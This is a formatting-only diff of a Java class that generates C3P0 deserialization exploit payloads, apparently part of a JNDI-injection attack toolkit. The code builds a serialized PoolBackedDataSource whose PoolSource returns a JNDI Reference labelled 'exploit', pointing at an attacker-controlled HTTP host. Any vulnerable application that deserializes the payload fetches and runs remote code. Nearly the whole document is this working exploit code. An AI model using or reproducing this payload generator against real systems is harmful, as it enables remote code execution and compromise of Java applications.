@@ -24,7 +24,7 @@ public class C3P0 {
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
 
         String className;
-        switch (type){
+        switch (type) {
             case command:
                 CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                 commandTemplate.cache();
@@ -77,14 +77,14 @@ public class C3P0 {
                 throw new IllegalStateException("Unexpected value: " + type);
         }
 
-        PoolBackedDataSource b = PoolBackedDataSource.class.newInstance();
-        Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
+        PoolBackedDataSource b     = PoolBackedDataSource.class.newInstance();
+        Field                field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
         field.setAccessible(true);
-        field.set(b, new PoolSource(className,"http://" + Config.ip + ":" + Config.httpPort + "/"));
+        field.set(b, new PoolSource(className, "http://" + Config.ip + ":" + Config.httpPort + "/"));
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baous);
+        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
         oos.writeObject(b);
         byte[] bytes = baous.toByteArray();
         oos.close();
@@ -98,21 +98,39 @@ public class C3P0 {
         private String className;
         private String url;
 
-        public PoolSource ( String className, String url ) {
+        public PoolSource(String className, String url) {
             this.className = className;
             this.url = url;
         }
 
-        public Reference getReference () throws NamingException {
+        public Reference getReference() throws NamingException {
             return new Reference("exploit", this.className, this.url);
         }
 
-        public PrintWriter getLogWriter () throws SQLException {return null;}
-        public void setLogWriter ( PrintWriter out ) throws SQLException {}
-        public void setLoginTimeout ( int seconds ) throws SQLException {}
-        public int getLoginTimeout () throws SQLException {return 0;}
-        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
-        public PooledConnection getPooledConnection () throws SQLException {return null;}
-        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
+        public PrintWriter getLogWriter() throws SQLException {
+            return null;
+        }
+
+        public void setLogWriter(PrintWriter out) throws SQLException {
+        }
+
+        public void setLoginTimeout(int seconds) throws SQLException {
+        }
+
+        public int getLoginTimeout() throws SQLException {
+            return 0;
+        }
+
+        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
+            return null;
+        }
+
+        public PooledConnection getPooledConnection() throws SQLException {
+            return null;
+        }
+
+        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
+            return null;
+        }
     }
 }
